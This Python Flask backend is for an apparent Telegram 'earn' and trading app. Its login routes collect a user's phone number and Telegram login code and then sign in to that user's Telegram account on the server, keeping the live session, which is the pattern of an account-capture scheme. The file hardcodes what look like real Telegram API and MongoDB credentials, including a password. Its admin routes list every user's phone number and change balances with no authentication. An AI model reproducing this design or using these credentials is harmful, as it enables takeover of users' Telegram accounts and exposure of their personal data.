import os
import asyncio
import nest_asyncio
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

# system fix for async
nest_asyncio.apply()

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_secret")
CORS(app)

# config (environment variable ব্যবহার করা ভালো)
API_ID = int(os.environ.get("API_ID", 36466824))
API_HASH = os.environ.get("API_HASH", "535ddcb85f2c3c74cc0ff532dd2c3406")
MONGO_URI = os.environ.get(
    "MONGO_URI",
    "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
)

client_db = MongoClient(MONGO_URI)
db = client_db['AAF_TeleEarn']

users_col = db['users']
settings_col = db['settings']

temp_clients = {}

# ---------------- HTML ROUTES ----------------

@app.route('/')
@app.route('/login')
def login():
    return render_template('login.html')


@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')


@app.route('/task')
def task():
    return render_template('task.html')


@app.route('/trading')
def trading():
    return render_template('treading.html')


@app.route('/account')
def account():
    return render_template('account.html')


@app.route('/wallet')
def wallet():
    return render_template('wallet.html')


@app.route('/admin')
def admin_page():
    return render_template('admin.html')


# ---------------- ADMIN API ----------------

@app.route('/api/admin/users')
def get_users():

    users = list(
        users_col.find(
            {},
            {"_id": 0}
        )
    )

    return jsonify(users)


@app.route('/api/admin/update_balance', methods=['POST'])
def update_balance():

    data = request.json

    users_col.update_one(

        {
            "telegram_id": int(data['uid'])
        },

        {
            "$set": {
                "main_balance": float(data['balance'])
            }
        }

    )

    return jsonify({"success": True})


# ---------------- TELEGRAM LOGIN ----------------

@app.route('/api/send_otp', methods=['POST'])
def send_otp():

    data = request.json

    phone = data.get('phone')

    loop = asyncio.get_event_loop()

    client = TelegramClient(

        StringSession(),

        API_ID,

        API_HASH,

        loop=loop

    )

    loop.run_until_complete(

        client.connect()

    )

    result = loop.run_until_complete(

        client.send_code_request(phone)

    )

    temp_clients[phone] = {

        "client": client,

        "hash": result.phone_code_hash

    }

    return jsonify({"success": True})


@app.route('/api/verify_login', methods=['POST'])
def verify_login():

    data = request.json

    phone = data.get('phone')

    code = data.get('code')

    if phone not in temp_clients:

        return jsonify({"success": False})

    loop = asyncio.get_event_loop()

    client = temp_clients[phone]["client"]

    h = temp_clients[phone]["hash"]

    user = loop.run_until_complete(

        client.sign_in(

            phone,

            code,

            phone_code_hash=h

        )

    )

    user_data = {

        "telegram_id": user.id,

        "phone": phone,

        "name": f"{user.first_name or ''} {user.last_name or ''}",

        "main_balance": 0,

        "joined": datetime.utcnow()

    }

    users_col.update_one(

        {

            "telegram_id": user.id

        },

        {

            "$set": user_data

        },

        upsert=True

    )

    session["uid"] = user.id

    return jsonify({

        "success": True,

        "uid": user.id

    })


# ---------------- TEST ----------------

@app.route('/test')
def test():

    return "SERVER RUNNING"


# ---------------- RUN ----------------

if __name__ == "__main__":

    port = int(

        os.environ.get(

            "PORT",

            10000

        )

    )

    app.run(

        host="0.0.0.0",

        port=port

    )
